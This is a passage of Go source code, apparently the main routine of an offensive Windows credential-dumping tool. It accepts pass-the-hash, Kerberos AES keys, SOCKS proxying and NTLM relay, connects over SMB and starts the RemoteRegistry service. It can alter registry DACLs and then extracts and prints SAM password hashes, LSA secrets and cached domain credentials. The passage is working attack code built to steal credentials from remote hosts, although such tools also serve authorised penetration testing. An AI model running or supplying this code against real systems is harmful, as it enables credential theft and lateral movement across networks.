		daclBackupFile, err = os.Open(backupFilename)
		if err != nil {
			log.Errorf("Failed to open local file %s to read original DACLs before restoring the ACLs with error: %s\n", backupFilename, err)
			return
		}
		defer daclBackupFile.Close()
	}

	if outputFilename != "" {
		outputFile, err = os.OpenFile(outputFilename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0600)
		if err != nil {
			log.Errorf("Failed to open local file %s for writing results with error: %s\n", outputFilename, err)
			return
		}
		defer outputFile.Close()
	}

	// Validate format
	if isFlagSet("dns-host") {
		parts := strings.Split(dnsHost, ":")
		if len(parts) < 2 {
			if dnsHost != "" {
				dnsHost += ":53"
				parts = append(parts, "53")
				log.Infof("No port number specified for --dns-host so assuming port 53")
			} else {
				fmt.Println("Invalid --dns-host")
				flag.Usage()
				return
			}
		}
		ip := net.ParseIP(parts[0])
		if ip == nil {
			fmt.Println("Invalid --dns-host. Not a valid ip host address")
			flag.Usage()
			return
		}
		p, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			fmt.Printf("Invalid --dns-host. Failed to parse port: %s\n", err)
			return
		}
		if p < 1 {
			fmt.Println("Invalid --dns-host port number")
			flag.Usage()
			return
		}
	}

	if socksHost != "" && socksPort < 1 {
		fmt.Println("Invalid --socks-port")
		flag.Usage()
		return
	}

	share := ""
	var hashBytes []byte
	var aesKeyBytes []byte

	if host == "" && targetIP == "" {
		log.Errorln("Must specify a hostname or ip")
		flag.Usage()
		return
	}
	if host != "" && targetIP == "" {
		targetIP = host
	} else if host == "" && targetIP != "" {
		host = targetIP
	}

	if dialTimeout < time.Second {
		log.Errorln("Valid value for the timeout is >= 1 seconds")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			fmt.Println("Failed to decode hash")
			log.Errorln(err)
			return
		}
	}

	if aesKey != "" {
		aesKeyBytes, err = hex.DecodeString(aesKey)
		if err != nil {
			fmt.Println("Failed to decode aesKey")
			log.Errorln(err)
			return
		}
		if len(aesKeyBytes) != 16 && len(aesKeyBytes) != 32 {
			fmt.Println("Invalid keysize of AES Key")
			return
		}
	}

	if aesKey != "" && !kerberos {
		fmt.Println("Must use Kerberos auth (-k) when using --aes-key")
		flag.Usage()
		return
	}

	if noPass {
		password = ""
		hashBytes = nil
		aesKeyBytes = nil
	} else {
		if (password == "") && (hashBytes == nil) && (aesKeyBytes == nil) {
			fmt.Printf("Enter password: ")
			passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
			fmt.Println()
			if err != nil {
				log.Errorln(err)
				return
			}
			password = string(passBytes)
		}
	}

	if dnsHost != "" {
		protocol := "udp"
		if dnsTCP {
			protocol = "tcp"
		}
		net.DefaultResolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{
					Timeout: dialTimeout,
				}
				return d.DialContext(ctx, protocol, dnsHost)
			},
		}
	}

	smbOptions := smb.Options{
		Host:              targetIP,
		Port:              port,
		DisableEncryption: noEnc,
		ForceSMB2:         forceSMB2,
	}

	if socksHost != "" {
		dialSocksProxy, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksHost, socksPort), nil, proxy.Direct)
		if err != nil {
			log.Errorln(err)
			return
		}
		smbOptions.ProxyDialer = dialSocksProxy
	}

	if kerberos {
		smbOptions.Initiator = &spnego.KRB5Initiator{
			User:        username,
			Password:    password,
			Domain:      domain,
			Hash:        hashBytes,
			AESKey:      aesKeyBytes,
			SPN:         "cifs/" + host,
			DCIP:        dcIP,
			DialTimeout: dialTimeout,
			ProxyDialer: smbOptions.ProxyDialer,
			DnsHost:     dnsHost,
			DnsTCP:      dnsTCP,
		}
	} else {
		smbOptions.Initiator = &spnego.NTLMInitiator{
			User:      username,
			Password:  password,
			Hash:      hashBytes,
			Domain:    domain,
			LocalUser: localUser,
		}
	}

	smbOptions.DialTimeout = dialTimeout
	var session *smb.Connection

	if relay {
		smbOptions.RelayPort = relayPort
		session, err = smb.NewRelayConnection(smbOptions)
	} else {
		session, err = smb.NewConnection(smbOptions)
	}
	if err != nil {
		log.Criticalln(err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired() {
		log.Noticeln("[-] Signing is required")
	} else {
		log.Noticeln("[+] Signing is NOT required")
	}

	if session.IsAuthenticated() {
		log.Noticef("[+] Login successful as %s\n", session.GetAuthUsername())
	} else {
		log.Noticeln("[-] Login failed")
		return
	}

	// Connect to IPC$ share
	share = "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer session.TreeDisconnect(share)

	// Check if RemoteRegistry is running, and if not, enable it
	registryStarted, registryDisabled, err := startRemoteRegistry(session, share)
	if err != nil {
		log.Errorln(err)
		return
	}

	defer func() {
		if !registryStarted {
			err = stopRemoteRegistry(session, share, registryDisabled)
			if err != nil {
				log.Errorf("Failed to restore status of RemoteRegistry service with error: %s\n", err)
			}
		}
	}()

	// Open connection to Windows Remote Registry pipe
	f, err := session.OpenFile(share, msrrp.MSRRPPipe)
	if err != nil {
		if err == smb.StatusMap[smb.StatusPipeNotAvailable] {
			// RemoteRegistry is not running but by requesting the pipe name it might be automatically started!
			time.Sleep(time.Second * 2)
			f, err = session.OpenFile(share, msrrp.MSRRPPipe)
			if err != nil {
				log.Errorln(err)
				return
			}
		} else {
			log.Errorln(err)
			return
		}
	}
	defer f.CloseFile()

	transport, err := smbtransport.NewSMBTransport(f)
	if err != nil {
		log.Errorf("Failed to create SMB transport: %v\n", err)
	}
	// Bind to Windows Remote Registry service
	bind, err := dcerpc.Bind(transport, msrrp.MSRRPUuid, msrrp.MSRRPMajorVersion, msrrp.MSRRPMinorVersion, msrrp.NDRUuid)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	// RPCCon is a wrapper for an RPC Bind that implements the Remote Registry functions
	rpccon := msrrp.NewRPCCon(bind)

	hKey, err := rpccon.OpenBaseKey(msrrp.HKEYLocalMachine)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer rpccon.CloseKeyHandle(hKey)

	if restoreDacl {
		restoreDaclFromBackup(rpccon, hKey)
		return
	}

	if dump {
		err = dumpOffline(session, rpccon, hKey, "C:/windows/temp")
		if err != nil {
			log.Errorln(err)
			return
		}
	} else {
		defer func() {
			// If calling defer on tryRollbackChanges directly, all the arguments
			// will be locked to their current values at time of calling defer
			tryRollbackChanges(rpccon, hKey, registryKeysModified)
		}()

		if sam {
			err = dumpSAM(rpccon, hKey, modifyDacl)
			if err != nil {
				log.Errorln(err)
				return
			}
		}
		if lsaSecrets {
			err = dumpLSASecrets(rpccon, hKey, modifyDacl)
			if err != nil {
				log.Errorln(err)
				return
			}
		}
		if dcc2 {
			err = dumpDCC2Cache(rpccon, hKey, modifyDacl)
			if err != nil {
				log.Errorln(err)
				return
			}
		}

		// Print results
		var out io.Writer
		if outputFile != nil {
			out = outputFile
		} else {
			out = os.Stdout
		}
		//TODO Write name of host?
		if len(samSecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping local SAM hashes")
			for i := range samSecretList {
				samSecretList[i].printSecret(out)
			}
		}
		if len(lsaSecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping LSA Secrets")
			for i := range lsaSecretList {
				lsaSecretList[i].printSecret(out)
			}
		}
		if len(dcc2SecretList) > 0 {
			fmt.Fprintln(out, "[*] Dumping cached domain credentials (domain/username:hash)")
			for i := range dcc2SecretList {
				dcc2SecretList[i].printSecret(out)
			}
		}
	}
}
